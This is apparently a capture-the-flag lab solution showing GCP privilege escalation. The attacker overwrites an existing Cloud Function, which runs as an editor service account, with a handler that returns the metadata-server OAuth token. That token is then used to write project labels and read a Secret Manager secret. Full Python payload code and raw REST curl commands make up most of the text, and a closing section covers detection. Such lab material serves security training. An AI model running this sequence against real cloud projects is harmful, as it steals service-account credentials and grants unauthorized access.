# Solution: Cloud Function Code Update to Existing Admin SA

The create-a-function attack against Cloud Functions is well-documented at this point. What gets less attention is the subtler variant: you don't need to create anything. If a privileged Cloud Function already exists in the environment -- and one almost always does, because production workloads run as service accounts -- then `cloudfunctions.functions.update` is all you need to turn it from an innocent workload into a credential thief. The SA is already attached. Cloud Build is already configured. The IAM bindings are already in place. You just need to swap what the function does.

This scenario makes that distinction explicit. The victim function has been running as a service account with `roles/editor` since Terraform deployed the lab. It serves a hello-world response handler. Your starting service account cannot read project secrets, cannot write to Cloud Storage, and cannot do anything particularly interesting on its own. What it can do is replace the function's code -- and that is enough.

There's a second wrinkle that makes this scenario technically distinct from the create variant: you cannot use `gcloud functions deploy` for the update. The `gcloud` CLI makes an extra preflight call to Cloud Build's `GetDefaultServiceAccount` endpoint before submitting the PATCH, and the starting service account is not granted that permission. The minimal permission set for this attack -- `cloudfunctions.functions.update`, `cloudfunctions.functions.sourceCodeSet`, and `iam.serviceAccounts.actAs` -- is sufficient for the raw Cloud Functions v2 REST API but not for the CLI wrapper around it. Real attackers working with minimal custom-role grants will hit this wall quickly.

## The Challenge

You start as `pl-prod-cf002-start`, a service account with no project-level IAM roles of its own. It cannot read Secret Manager secrets, cannot list Compute Engine instances, and cannot interact with Cloud Storage outside its own staging bucket.

What it does have is a pair of narrowly-scoped grants: a custom role at the project level granting `cloudfunctions.functions.update`, `cloudfunctions.functions.sourceCodeSet`, and `run.routes.invoke`, and a `roles/iam.serviceAccountUser` binding on a second service account -- `pl-prod-cf002-target` -- which holds `roles/editor` on the project.

Critically, there is already a 2nd-gen Cloud Function deployed in this project -- `pl-cf002-victim-{resource_suffix}` -- that runs as `pl-prod-cf002-target`. It serves a benign hello-world handler. Your job is to replace that handler with something that reads the metadata server.

## Reconnaissance

Confirm your starting identity and its limits:

```bash
# Verify who you are
gcloud auth list --filter=status:ACTIVE --format='value(account)'
# pl-prod-cf002-start@<project_id>.iam.gserviceaccount.com

# Confirm you cannot read the flag directly
gcloud secrets versions access latest --secret=pl-gcp-cloudfunctions-002-flag \
  --impersonate-service-account=pl-prod-cf002-start@<project_id>.iam.gserviceaccount.com
# ERROR: PERMISSION_DENIED
```

Next, look at what service accounts exist and what roles they hold:

```bash
gcloud iam service-accounts list --format='value(email)'

gcloud projects get-iam-policy <project_id> \
  --flatten="bindings[].members" \
  --filter="bindings.members:pl-prod-cf002-target@<project_id>.iam.gserviceaccount.com" \
  --format="table(bindings.role)"
# roles/editor
# roles/secretmanager.secretAccessor (on the flag secret)
```

`roles/editor` on `pl-prod-cf002-target`. Now check whether your starting account has any relationship to it:

```bash
gcloud iam service-accounts get-iam-policy \
  pl-prod-cf002-target@<project_id>.iam.gserviceaccount.com \
  --impersonate-service-account=pl-prod-cf002-start@<project_id>.iam.gserviceaccount.com
```

The policy includes a binding granting `roles/iam.serviceAccountUser` to your starting service account. That grant means you're allowed to attach this account's identity to compute. Now look at the existing Cloud Functions in the project:

```bash
gcloud functions list --gen2 \
  --impersonate-service-account=pl-prod-cf002-start@<project_id>.iam.gserviceaccount.com

gcloud functions describe pl-cf002-victim-<resource_suffix> --gen2 --region=<region> \
  --impersonate-service-account=pl-prod-cf002-start@<project_id>.iam.gserviceaccount.com \
  --format="value(serviceConfig.serviceAccountEmail)"
# pl-prod-cf002-target@<project_id>.iam.gserviceaccount.com
```

The existing function is already running as `pl-prod-cf002-target`. You don't need to create a new function -- you just need to change what the existing one does.

## Exploitation

The `cloudfunctions.functions.update` grant lets you replace the code of an existing function. The `actAs` grant on `pl-prod-cf002-target` satisfies the check the PATCH API performs against the function's existing runtime SA, even though you are not changing the SA. And `run.routes.invoke` lets you invoke the result directly via the function's Cloud Run URL using an OIDC identity token.

The one constraint: you cannot use `gcloud functions deploy`. The `gcloud` CLI makes an extra preflight call to `GetDefaultServiceAccount` on the Cloud Build API before submitting the PATCH, and `pl-prod-cf002-start` was not granted that permission -- the scenario intentionally scopes the custom role to the true minimal set for the raw API. You will need to drive the three-step upload process by hand.

Start by writing your malicious handler. The payload is simple: read the OAuth access token from the metadata server and return it in the HTTP response.

```python
# main.py
import json
import urllib.request

def exfiltrate_token(request):
    metadata_url = (
        "http://metadata.google.internal/computeMetadata/v1/"
        "instance/service-accounts/default/token"
    )
    req = urllib.request.Request(
        metadata_url, headers={"Metadata-Flavor": "Google"}
    )
    with urllib.request.urlopen(req, timeout=5) as response:
        token_data = json.loads(response.read())
    return (json.dumps(token_data), 200, {"Content-Type": "application/json"})
```

Package it alongside a minimal `requirements.txt`:

```bash
mkdir src
# write main.py and requirements.txt (functions-framework==3.*) into src/
cd src && zip -qr ../src.zip . && cd ..
```

Now mint a bearer token for the starting service account and execute the three raw API calls:

```bash
# Mint a bearer token for pl-prod-cf002-start via impersonation
ACCESS_TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account=pl-prod-cf002-start@<project_id>.iam.gserviceaccount.com)

# Step 1: Request a presigned upload URL (cloudfunctions.functions.sourceCodeSet)
UPLOAD_RESPONSE=$(curl -s -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}' \
  "https://cloudfunctions.googleapis.com/v2/projects/<project_id>/locations/<region>/functions:generateUploadUrl")

UPLOAD_URL=$(echo "$UPLOAD_RESPONSE" | jq -r '.uploadUrl')
UPLOAD_BUCKET=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.bucket')
UPLOAD_OBJ=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.object')

# Step 2: Upload the malicious source zip to the presigned URL
curl -s -o /dev/null -w "%{http_code}" -X PUT \
  -H "Content-Type: application/zip" \
  --data-binary "@src.zip" \
  "$UPLOAD_URL"
# 200

# Step 3: PATCH the function -- replace code and entry point, leave the SA alone
curl -s -X PATCH \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "https://cloudfunctions.googleapis.com/v2/projects/<project_id>/locations/<region>/functions/pl-cf002-victim-<resource_suffix>?updateMask=buildConfig.source,buildConfig.entryPoint" \
  -d "{
    \"buildConfig\": {
      \"entryPoint\": \"exfiltrate_token\",
      \"source\": {
        \"storageSource\": {
          \"bucket\": \"$UPLOAD_BUCKET\",
          \"object\": \"$UPLOAD_OBJ\"
        }
      }
    }
  }"
```

The PATCH call returns a long-running operation. Cloud Build compiles and deploys the new code; this typically takes one to three minutes. Poll until the function is back to `ACTIVE`:

```bash
# Poll until ACTIVE with the updated entry point
gcloud functions describe pl-cf002-victim-<resource_suffix> \
  --gen2 --region=<region> \
  --impersonate-service-account=pl-prod-cf002-start@<project_id>.iam.gserviceaccount.com \
  --format="value(state,buildConfig.entryPoint)"
# ACTIVE  exfiltrate_token
```

Now invoke the updated function. You cannot use `gcloud functions call` here either -- it mishandles OIDC token forwarding for gen2 HTTP-triggered functions when combined with SA impersonation. Use a direct curl invocation with an OIDC identity token instead:

```bash
FUNCTION_URL=$(gcloud functions describe pl-cf002-victim-<resource_suffix> \
  --gen2 --region=<region> \
  --impersonate-service-account=pl-prod-cf002-start@<project_id>.iam.gserviceaccount.com \
  --format="value(serviceConfig.uri)")

ID_TOKEN=$(gcloud auth print-identity-token \
  --impersonate-service-account=pl-prod-cf002-start@<project_id>.iam.gserviceaccount.com \
  --audiences="$FUNCTION_URL")

FUNCTION_BODY=$(curl -sS -H "Authorization: Bearer $ID_TOKEN" "$FUNCTION_URL")
EXFILTRATED_TOKEN=$(echo "$FUNCTION_BODY" | jq -r '.access_token')
```

The response body is a JSON object containing `access_token` -- a short-lived OAuth 2.0 bearer token minted for `pl-prod-cf002-target` by its own metadata server.

## Verification

Confirm the token belongs to the target service account:

```bash
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$EXFILTRATED_TOKEN" \
  | jq -r '.email'
# pl-prod-cf002-target@<project_id>.iam.gserviceaccount.com
```

Then confirm the `roles/editor` write access by patching a project label and reading it back:

```bash
curl -s -X PATCH \
  -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"labels": {"pl-privesc-verified": "true"}}' \
  "https://cloudresourcemanager.googleapis.com/v1/projects/<project_id>?updateMask=labels" \
  | jq -r '.name'
# projects/<project_id>
```

The label write succeeds. Your starting account, operating alone, would have been denied that call.

## Capture the Flag

The CTF flag is stored as the latest version of a Secret Manager secret (`pl-gcp-cloudfunctions-002-flag`). The target service account holds an explicit `roles/secretmanager.secretAccessor` binding on that specific secret -- `roles/editor` alone does not include `secretmanager.versions.access`, so the lab adds the accessor grant directly.

Use the exfiltrated bearer token against the Secret Manager REST API:

```bash
SECRET_RESPONSE=$(curl -s \
  -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/<project_id>/secrets/pl-gcp-cloudfunctions-002-flag/versions/latest:access")

echo "$SECRET_RESPONSE" | jq -r '.payload.data' | openssl base64 -d -A
```

The Secret Manager API returns the secret payload base64-encoded in `payload.data`. Decoding it reveals the flag.

This works for the same reason the project label write did: the bearer token authenticates as `pl-prod-cf002-target`, which carries both the project-wide `roles/editor` permissions and the secret-specific `secretAccessor` grant. The token is not a gcloud impersonation session and cannot be passed to `--impersonate-service-account` for interactive CLI commands -- but it is a fully valid OAuth bearer token for any direct REST API call.

## What Happened

You escalated from a service account with zero project-level permissions to one holding `roles/editor` -- and from there to a project secret -- by replacing the source code of a Cloud Function that was already running as a privileged identity. No new function was created. No IAM bindings were modified. The runtime service account did not change. The only change was the handler code, and Cloud Build took care of the rest.

This attack is harder to detect than the create variant precisely because it looks like normal CI/CD activity: code updates to existing functions are routine. The signal is not the update itself -- it's the mismatch between the caller's own permissions and the permissions held by the function's runtime SA. A developer account with `cloudfunctions.functions.update` on a function that runs as an admin SA is a standing misconfiguration that exists whether or not anyone ever exploits it.

The second lesson here is that gcloud's extra mechanic permissions are not a security control -- they are a usability feature. The raw API does the same thing with fewer required permissions. Scoping a custom role to the gcloud-required set does not prevent the attack; it prevents the gcloud wrapper. A motivated attacker switches to `curl` and continues.
